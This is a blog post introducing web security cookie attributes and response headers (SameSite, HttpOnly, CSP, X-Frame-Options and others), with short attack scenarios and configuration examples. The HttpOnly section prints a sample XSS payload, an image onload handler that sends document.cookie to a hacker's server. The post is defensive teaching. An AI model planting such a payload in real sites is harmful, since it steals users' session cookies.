---
title: All you have to know about Web Security
description: An thorough introduction on some terms and keywords related to web security. With this post, you can know how to prevent your site from malicious attacks.
date: 2021-05-28
tags:
  - Web Security
  - Cookie
layout: layouts/post.njk
---


## SameSite

#### Explanation
  Decide if your cookie can be sent with cross-site request. It's used for preventing [CSRF](https://developer.mozilla.org/en-US/docs/Glossary/CSRF).
#### How hackers attack you

1. You have logged in to your bitcoin wallet of website A and it returned a cookie set in your browser WITHOUT `SameSite` attribute.
2. The hacker send you an email with a fake link
3. You click the link, and it actually sends a POST cross-site request to website A, which withdraws all your money to the hacker's bank account.

#### How to set `SameSite` attribute
  The server-side can return as follows:

> Set-Cookie: key=value; SameSite=Strict

- Reference
  https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite

## HttpOnly:

#### Explanation

A cookie cannot be accessed by JavaScript (i.e by `document.cookie`) and can only be sent to the server automatically. It's used for preventing [XSS](<https://developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks#cross-site_scripting_(xss)>).

#### How hackers attack you

1. In a forum website, the hacker may leave a comment to the post as follows:

```html
<img src="nothing.gif" onload="sendToHackersServer(document.cookie)" />
```

2. Any other user who enters into this post, their cookies of this forum will be sent to the hacker.

#### How to set `SameSite` attribute
  The server-side can return as follows:

> Set-Cookie: id=a3fWa; Expires=Thu, 21 Oct 2021 07:28:00 GMT; HttpOnly

- Reference
  https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies

## Secure

#### Explanation
  A cookie can only be sent over HTTPS protocol.

#### How to set `Secure` attribute

> Set-Cookie: id=a3fWa; Expires=Thu, 21 Oct 2021 07:28:00 GMT; Secure

## \_\_Host-

#### Explanation
  Prefix the name of the cookie with `__Host-` will enforce `Set-Cookie` header to have `Secure` attribute.

## Referrer-Policy

#### Explanation
  This will decide how much referrer information will be included along with requests. It can be specified as an attribute of `<a>` tag when you're trying to open an external website. Without this, the opened webiste can access the `Referer` header to know referrer information of your site.

#### How to apply it

```html
<a href="https://external-site.com" rel="noreferrer"></a>
```

- Reference
  https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy

## Cross-Origin-Opener-Policy

#### Explanation
  When opening an external site from your site, to prevent the external site to access [window.opener](https://developer.mozilla.org/en-US/docs/Web/API/Window/opener) of your site (which can be used to do malicious behaviour against your site such as CSRF attack).

#### How to apply it

```html
<a href="https://external-site.com" rel="noopener"></a>
```

- Reference
  https://developer.mozilla.org/en-US/docs/Web/HTML/Link_types/noopener

## Content Security Policy

#### Explanation
  This can do more fine-grained control on what [resources](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/default-src) the user agent is allowed to load for that page. Even without any setting, default [same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy) will be applied.

#### How to apply it
  **Option 1:**
  Return `Content-Security-Policy` HTTP header for each request.

Example:

> Content-Security-Policy: default-src 'self' trusted.com \*.trusted.com

**Option 2:**
Write in HTML `<meta>` tag.

```html
<meta
  http-equiv="Content-Security-Policy"
  content="default-src 'self'; img-src https://*; child-src 'none';"
/>
```

- Reference: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP

## X-Content-Type-Options

- Explanation
  It's sent as a response HTTP header to decide if you'd like to opt out from [MIME type sniffing](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types#mime_sniffing) and ask the browser to respect what's specified in `Content-Type` headers. The reason that the browser does MIME type sniffing is that they believe the MIME type is incorrect so they want to make a guess. It involves security concerns because some MIME types are executable contents.

#### How to apply it

```bash
X-Content-Type-Options: nosniff
```

## X-Frame-Options

#### Explanation
  It's sent as a response HTTP header to decide if the browser can render a page in [`iframe`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe) or [`embed`](https://developer.mozilla.org/en-US/docs/Web/HTML/Element/embed) to prevent [click-jacking attacks](https://developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks#click-jacking).

#### How hackers attack you

1. The hacker put an action buttion above an `iframe`
2. Inside `iframe`, the hacker render the page of the bitcoin site which you have a wallet in it.
3. You click the action button and think it'll complete certain scenario that the hacker designed for you.
4. What's really going on is that the action button will use you cookie to do cross-site request and transfer all the money from your wallet to hackers' bank account.

#### How to apply it

```bash
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
```

- Reference
  https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options

## Origin and Referrer

#### Explanation
  [Origin](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin) and [Referrer](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer) are request headers. They are quite similar, which tells where the request originates from, but `Origin` doesn't have path information.

- Example

```bash
Origin: https://developer.mozilla.org
Referer: https://developer.mozilla.org/en-US/docs/Web/JavaScript
```

## Reference

- https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
